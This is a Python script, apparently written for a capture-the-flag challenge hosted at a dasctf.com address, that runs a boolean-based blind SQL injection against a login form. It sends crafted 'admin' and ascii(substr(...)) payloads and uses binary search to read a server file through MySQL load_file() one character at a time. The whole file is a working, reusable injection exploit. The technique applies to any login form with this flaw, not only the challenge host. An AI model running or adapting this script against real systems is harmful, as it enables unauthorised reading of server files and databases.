#!/usr/bin/env python3
"""布尔盲注逐字符提取脚本 — 从 load_file() 读取文件内容"""
import requests
import sys

TARGET = "http://6104ac91f00692661c75bbe3.http-ctf2.dasctf.com/login.php"

def check(payload: str) -> bool:
    """
    发送布尔盲注 payload，返回 TRUE/FALSE。

    TRUE  → "账号或密码错误" → SQL 条件成立，查到了用户行
    FALSE → "账号不存在"     → SQL 条件不成立，空结果集
    """
    resp = requests.post(TARGET, data={"name": payload, "pass": "x"})
    try:
        msg = resp.json().get("msg", "")
        return "错误" in msg          # "账号或密码错误" 包含 "错误"
    except Exception:
        return False

def extract_value(query_expr: str, max_len: int = 500) -> str:
    """
    用二分查找逐字符提取 SQL 子查询的结果字符串。

    query_expr: SQL 表达式，返回值必须是字符串
               如 "load_file('/var/www/html/user.php')"
    max_len:   最大提取长度（防止死循环）
    """
    result = ""
    print(f"[*] Extracting...", end="", flush=True)

    for pos in range(1, max_len + 1):
        # ── 二分查找当前字符的 ASCII 码 ──
        low, high = 1, 127
        while low <= high:
            mid = (low + high) // 2
            # ascii(substr(..., pos, 1)) > mid ?
            payload = (
                f"admin' and ascii(substr({query_expr},{pos},1))>{mid}"
                f" and '1'='1"
            )
            if check(payload):          # TRUE → 字符 ASCII 码 > mid
                low = mid + 1
            else:                        # FALSE → 字符 ASCII 码 ≤ mid
                high = mid - 1

        # ── 验证：精确匹配确认该位置确实有字符 ──
        verify = (
            f"admin' and ascii(substr({query_expr},{pos},1))={low}"
            f" and '1'='1"
        )
        if check(verify):
            ch = chr(low)
            result += ch
            # 终端友好输出：控制字符转义显示
            if low == 10:        # 换行
                sys.stdout.write("\\n\n")
            elif low == 13:      # 回车
                sys.stdout.write("\\r")
            elif low == 9:       # 制表符
                sys.stdout.write("\\t")
            elif low < 32:       # 其他不可见字符
                sys.stdout.write(f"[{low}]")
            else:
                sys.stdout.write(ch)
            sys.stdout.flush()
        else:
            break                 # 连续匹配失败 → 文件结束

    print()
    return result


if __name__ == "__main__":
    # 读取 login.php 的源码
    content = extract_value("load_file('/var/www/html/user.php')")
    print(f"\n[+] 提取结果 ({len(content)} 字符):")
    print(content)